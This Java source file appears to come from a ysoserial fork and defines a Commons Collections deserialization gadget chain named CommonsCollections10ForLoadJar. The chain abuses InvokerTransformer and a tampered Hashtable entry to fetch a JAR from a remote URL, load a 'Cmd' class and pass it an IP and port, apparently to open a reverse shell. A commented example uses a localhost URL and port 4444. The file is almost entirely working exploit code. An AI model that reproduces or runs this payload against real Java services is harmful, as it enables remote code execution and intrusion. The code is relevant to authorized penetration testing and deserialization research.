package ysoserial.payloads;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


public class CommonsCollections10ForLoadJar extends
    PayloadRunner implements ObjectPayload<Hashtable> {
    public Hashtable getObject(final String ... ipAndHost) throws Exception {
        // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
        String payloadUrl = ipAndHost[0];

        String ip2 = ipAndHost[1];
        Integer port2 = Integer.parseInt(ipAndHost[2]);
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[] { new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }),
            new InvokerTransformer(
                "newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                    payloadUrl) } } }),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { "Cmd" }),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { String.class,int.class } }),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { ip2,port2 } }),
            new ConstantTransformer(1) };
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        Hashtable hashtable = new Hashtable();
        hashtable.put("foo",1);
        // 获取hashtable的table类属性
        Field tableField = Hashtable.class.getDeclaredField("table");
        Reflections.setAccessible(tableField);
        Object[] table = (Object[])tableField.get(hashtable);
        Object entry1 = table[0];
        if(entry1==null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        Field keyField = entry1.getClass().getDeclaredField("key");
        Reflections.setAccessible(keyField);
        // 将key属性给替换成构造好的TiedMapEntry实例
        keyField.set(entry1, entry);
        // 填充真正的命令执行代码
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return hashtable;
    }
    public static Constructor<?> getFirstCtor(final String name)
        throws Exception {
        final Constructor<?> ctor = Class.forName(name)
            .getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
    public static Field getField(final Class<?> clazz, final String fieldName)
        throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field == null && clazz.getSuperclass() != null) {
            field = getField(clazz.getSuperclass(), fieldName);
        }
        field.setAccessible(true);
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName,
        final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections10ForLoadJar.class, args);
    }

}
